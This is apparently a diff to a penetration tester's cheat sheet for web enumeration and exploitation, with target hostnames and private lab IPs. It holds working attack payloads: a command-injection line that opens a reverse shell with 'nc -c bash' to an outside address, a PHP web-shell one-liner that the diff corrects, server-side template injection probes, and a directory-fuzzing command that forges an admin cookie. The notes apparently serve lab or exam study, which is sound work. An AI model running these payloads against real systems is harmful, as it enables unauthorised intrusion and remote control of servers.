@@ -21,6 +21,7 @@ java -jar iis_shortname_scanner.jar $url/ /opt/windows/IIS-ShortName-Scanner/rel
 cd /opt/windows/sns && go run main.go -u http://nagoya.nagoya-industries.com
 ffuf -k -u "$url/FUZZ" -w /opt/SecLists/Discovery/Web-Content/content_discovery_all.txt -fs 106
 /opt/SecLists/Discovery/Web-Content/content_discovery_all.txt
+feroxbuster -k -u $url:3000 -o feroxbuster.out -w /opt/SecLists/Discovery/Web-Content/megadir.txt -b "connect.sid=s%3Awy8r5K11MKvRQ7w5lr8QS9KyHJr_q92B.2fbWC6h%2FH6u7sCs06k4dwmYRTFkdvhy%2BdwOjxLaufwA; userLevel=YWRtaW4%3d"
 ```
 
 #### Fuzzing Subdomains & vhosts
@@ -87,7 +88,7 @@ curl -si --data '{"user": "admin", "url", "http://192.168.45.178/update"}'$url:1
 cp /opt/SecLists/Discovery/Web-Content/api/objects.txt apis
 sed -i 's/^/{GOBUSTER}\//' apis
 gobuster dir -u $url:5002 -w /opt/SecLists/Discovery/Web-Content/combined_directories.txt -p apis
-# Start testing with curl for csrf.
+# Start testing with curl for ssti.
 curl -si --data "code=1+1" # {7*7}...
 curl http://192.168.195.117:50000/verify -si --data "code=os.system('nc -c bash 192.168.45.178 50000')"
 ```
@@ -147,6 +148,24 @@ python console.py -t $url/wordpress
 #### Look at the cookies.. if there's a cookie name that you don't know, it could be coming from a plugin that has a vulnerability, such as pmpro_visit=1.
 
 #### Brute forcing admin/login panel with Burp Intruder
+
+#### Input Form
+
+- Try SSTI 
+
+```bash
+42*42
+{42*42}
+{{42*42}}
+{{{42*42}}}
+#{42*42}
+${42*42}
+<%=42*42 %>
+{{=42*42}}
+{^xyzm42}1764{/xyzm42}
+${donotexists|42*42}
+[[${42*42}]]
+```
 
 #### Create a wordlist from the webpage using cewl:
 
@@ -383,7 +402,7 @@ If you have the "GIF89a;" at the beginning, you may be able to bypass blacklists
 
 ```bash
 GIF89a;
-<?php system($_GET["cmd"]); ?
+<?php system($_GET["cmd"]); ?>
 ```
 
 #### File Upload Vulns (Non-Executable)
